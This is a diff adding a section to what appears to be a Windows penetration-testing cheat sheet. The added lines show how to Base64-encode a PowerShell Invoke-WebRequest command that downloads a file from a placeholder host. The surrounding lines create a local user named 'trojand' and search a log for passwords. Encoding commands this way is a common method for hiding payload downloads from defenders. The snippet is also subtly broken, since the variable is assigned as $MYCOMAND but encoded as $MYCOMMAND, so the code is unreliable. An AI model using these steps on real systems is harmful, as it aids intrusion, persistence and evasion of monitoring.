@@ -98,4 +98,11 @@ net user trojand imareallyreallyreallylongpasswordnow
     Get-Content output.log -Tail 10 -Wait | Select-String -Pattern "password" -Context 0,3
     ```
 
+### Base64 Encode Powershell commands
+```powershell
+$MYCOMAND = "Invoke-WebRequest -Uri 'http://www.contoso.com' -OutFile 'C:\path\file'"
+$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MYCOMMAND))
+Write-Output $ENCODED
+```
+
 [^1]: [Abatchy](https://www.abatchy.com/2017/03/powershell-download-file-one-liners)
